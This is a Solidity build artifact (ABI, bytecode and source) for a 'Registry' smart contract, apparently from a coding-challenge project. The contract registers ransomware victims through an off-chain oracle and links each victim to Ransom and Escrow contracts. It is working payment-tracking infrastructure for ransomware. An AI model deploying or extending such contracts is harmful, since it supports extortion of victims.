{
  "contractName": "Registry",
  "abi": [
    {
      "inputs": [
        {
          "name": "_oracleAccount",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "id",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "ransomAddr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "authToken",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "origin",
          "type": "address"
        }
      ],
      "name": "AuthEvent",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "maxPending",
          "type": "uint16"
        }
      ],
      "name": "setMaxPending",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        },
        {
          "name": "authToken",
          "type": "uint256"
        }
      ],
      "name": "registerVictim",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "id",
          "type": "uint256"
        },
        {
          "name": "ransomAddr",
          "type": "address"
        },
        {
          "name": "escrowAddr",
          "type": "address"
        },
        {
          "name": "authResult",
          "type": "bool"
        }
      ],
      "name": "authCallback",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "victimCount",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "victimId",
          "type": "uint256"
        }
      ],
      "name": "getRansomAddressForVictim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "victimId",
          "type": "uint256"
        }
      ],
      "name": "getEscrowAddressForVictim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "die",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051602080610dad8339810180604052810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600560006101000a81548161ffff021916908361ffff16021790555080600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006002819055506000600560026101000a81548161ffff021916908361ffff16021790555050610ca4806101096000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806320b6afb31461008857806335f46994146100d7578063429b5e89146100ee5780634cb20dea1461015b57806388ac79f61461018c57806398888a16146101f9578063cde2aa6314610272575b600080fd5b34801561009457600080fd5b506100bd600480360381019080803590602001909291908035906020019092919050505061029d565b604051808215151515815260200191505060405180910390f35b3480156100e357600080fd5b506100ec6104d5565b005b3480156100fa57600080fd5b50610119600480360381019080803590602001909291905050506105d5565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016757600080fd5b5061018a600480360381019080803561ffff169060200190929190505050610614565b005b34801561019857600080fd5b506101b7600480360381019080803590602001909291905050506106f9565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561020557600080fd5b5061027060048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803515159060200190929190505050610738565b005b34801561027e57600080fd5b50610287610c6e565b6040518082815260200191505060405180910390f35b600080600560029054906101000a900461ffff1661ffff161180156102e95750600560029054906101000a900461ffff1661ffff16600560009054906101000a900461ffff1661ffff16145b156102f757600090506104cf565b6005600081819054906101000a900461ffff168092919060010191906101000a81548161ffff021916908361ffff160217905550506060604051908101604052808481526020013373ffffffffffffffffffffffffffffffffffffffff168152602001600073ffffffffffffffffffffffffffffffffffffffff16815250600460008581526020019081526020016000206000820151816000015560208201518160010160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060408201518160020160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055509050507f75e933e6e9a09ae260f246bb811f2af1f0455b041a7ab91691968dcc4a28c89283338432604051808581526020018473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200194505050505060405180910390a1600190505b92915050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561059a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601c8152602001807f4f6e6c7920746865204f776e65722063616e2063616c6c20746869730000000081525060200191505060405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b600080600083815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156106d9576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601c8152602001807f4f6e6c7920746865204f776e65722063616e2063616c6c20746869730000000081525060200191505060405180910390fd5b80600560026101000a81548161ffff021916908361ffff16021790555050565b600080600083815260200190815260200160002060010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156107ff576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f4f6e6c7920746865204f7261636c652063616e2063616c6c207468697300000081525060200191505060405180910390fd5b6004600086815260200190815260200160002090508373ffffffffffffffffffffffffffffffffffffffff168160010160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161480156108765750806000015485145b15156108ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260118152602001807f756e6b6e6f776e2076696374696d20696400000000000000000000000000000081525060200191505060405180910390fd5b600115158215151415610a3f57828160020160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060008083600001548152602001908152602001600020600082015481600001556001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160010160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506002820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160020160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055509050506002600081548092919060010191905055505b6005600081819054906101000a900461ffff16809291906001900391906101000a81548161ffff021916908361ffff16021790555050600460008681526020019081526020016000206000808201600090556001820160006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556002820160006101000a81549073ffffffffffffffffffffffffffffffffffffffff021916905550508273ffffffffffffffffffffffffffffffffffffffff1663e1bf0eb78686856040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001821515151581526020019350505050600060405180830381600087803b158015610b9057600080fd5b505af1158015610ba4573d6000803e3d6000fd5b505050508373ffffffffffffffffffffffffffffffffffffffff166309c4222184846040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018215151515815260200192505050600060405180830381600087803b158015610c4f57600080fd5b505af1158015610c63573d6000803e3d6000fd5b505050505050505050565b60006002549050905600a165627a7a72305820ce7b9b80c7f0c302eda723740af73d1762f0de821eb5c28e3042b9927624e22c0029",
  "source": "pragma solidity ^0.4.24;\n\nimport \"./Escrow.sol\";\nimport \"./Ransom.sol\";\n\n///@title Registry contract\ncontract Registry {\n    /**\n     * @dev The Registry contract is what keeps track of all victims and associated Ransom and Escrow contracts. There\n     * should only ever be one active Registry contract.\n     */\n\n    ///@dev VictimInfo struct for keeping track of the victim ID, Ransom and Escrow contract addresses\n    struct VictimInfo {\n        uint victimId;      //!< The unique ID of the victim\n        address ransomAddr; //!< The address of the Ransom contract for the victim\n        address escrowAddr; //!< The address of the Escrow contract associated with Ransom\n    }\n\n    ///@dev The AuthEvent is an event that gets triggered when a new Ransom contract is deployed and attempts to register\n    ///with the Registry\n    event AuthEvent(\n        uint id,            //!< The unique ID of the victim\n        address ransomAddr, //!< The address of the Ransom contract\n        uint authToken,     //!< The one-time authentication code\n        address origin      //!< The origin of the transaction\n    );\n\n    mapping(uint => VictimInfo) victimMap;      //!< Mapping from victim IDs to VictimInfo structs\n    address owner;          //!< The address of the contract owner\n    uint victims;           //!< Count of total victims\n    address oracleAccount;  //!< The address of the off-chain authentication and decryption Oracle\n\n    mapping(uint => VictimInfo) authMap;            //!< Mapping from victim IDs to VictimInfo structs (used before auth)\n    uint16 pendingAuthCount;                         //!< Number of active pending authentications\n    uint16 MAX_PENDING_AUTH_REQUESTS;  //!< Max number of pending authentications\n\n    ///@dev Restricts the caller to be the Oracle account\n    modifier restrictSenderToOracle {\n        require(msg.sender == oracleAccount, \"Only the Oracle can call this\");\n        _;\n    }\n\n    ///@dev Restricts the caller to be the owner account\n    modifier restrictSenderToOwner {\n        require(msg.sender == owner, \"Only the Owner can call this\");\n        _;\n    }\n\n    /**\n     * @dev Registry constructor\n     * @param _oracleAccount address of the Oracle account\n     */\n    constructor(address _oracleAccount) public {\n        owner = msg.sender;\n        pendingAuthCount = 0;\n        oracleAccount = _oracleAccount;\n        victims = 0;\n        MAX_PENDING_AUTH_REQUESTS = 0;  // start unused, may set later\n    }\n\n    /**\n     * @dev Sets MAX_PENDING_AUTH_REQUESTS\n     * @param maxPending requested value for MAX_PENDING_AUTH_REQUESTS, 0 to disable\n     */\n    function setMaxPending(uint16 maxPending) external restrictSenderToOwner {\n        MAX_PENDING_AUTH_REQUESTS = maxPending;\n    }\n\n    /**\n     * @dev Authenticates and register a new Victim. Anyone can call this function, but we rate limit to a max \n     * of MAX_PENDING_AUTH_REQUESTS pending requests at a time. The off-chain Oracle watches for AuthEvents and\n     * processes each request.\n     * @param id the unique ID of the victim\n     * @param authToken the one-time authentication code\n     * @return bool this function will always return true unless the MAX_PENDING_AUTH_REQUEST limit has been reached\n     */\n    function registerVictim(uint id, uint authToken) external returns (bool) {\n        if (MAX_PENDING_AUTH_REQUESTS > 0 && pendingAuthCount == MAX_PENDING_AUTH_REQUESTS) {\n            return false;\n        }\n        pendingAuthCount++;\n        authMap[id] = VictimInfo(id, msg.sender, 0);\n\n        emit AuthEvent(id, msg.sender, authToken, tx.origin);\n\n        return true;\n    }\n\n    /**\n     * @dev Authentication callback function restricted to the off-chain Oracle. The authResult indicates\n     * whether authentication was succesful and to store the victim information.\n     * @param id the unique ID of the victim\n     * @param ransomAddr address of the Ransom contract\n     * @param escrowAddr address of the Escrow contract\n     * @param authResult true/false whether authentication succeeded\n     */\n    function authCallback(uint id, address ransomAddr, address escrowAddr, bool authResult) external restrictSenderToOracle {\n        VictimInfo storage vicInfo = authMap[id]; \n        \n        require(vicInfo.ransomAddr == ransomAddr && id == vicInfo.victimId, \"unknown victim id\");\n\n        if (authResult == true) {\n            vicInfo.escrowAddr = escrowAddr;\n            victimMap[vicInfo.victimId] = vicInfo;\n            victims++;\n        }\n        pendingAuthCount--;\n        delete authMap[id];\n        Escrow(escrowAddr).authCallback(id, ransomAddr, authResult);\n        Ransom(ransomAddr).authCallback(escrowAddr, authResult);\n    }\n\n    /**\n     * @dev Returns the total victim count\n     * @return uint the number of registered victims\n     */\n    function victimCount() external view returns (uint) {\n        return victims;\n    }\n\n    /**\n     * @dev Gets the Ransom contract address for a given victim ID\n     * @param victimId the unique ID of the victim\n     * @return address the Ransom contract address\n     */\n    function getRansomAddressForVictim(uint victimId) external view returns (address) {\n        return victimMap[victimId].ransomAddr;\n    }\n\n    /**\n     * @dev Gets the Escrow contract address for a given victim ID\n     * @param victimId the unique ID of the victim\n     * @return address the Escrow contract address\n     */\n    function getEscrowAddressForVictim(uint victimId) external view returns (address) {\n        return victimMap[victimId].escrowAddr;\n    }\n    \n    /**\n     * @dev Self-destructs this contract\n     */\n    function die() external restrictSenderToOwner {\n        selfdestruct(owner);\n    }\n\n}\n",
  "sourcePath": "/Users/vkorolev/Proj/mine/tla/tla-challenge-18/task-6/contracts/Registry.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "3.0.0-beta.1",
  "updatedAt": "2018-12-28T20:58:23.749Z"
}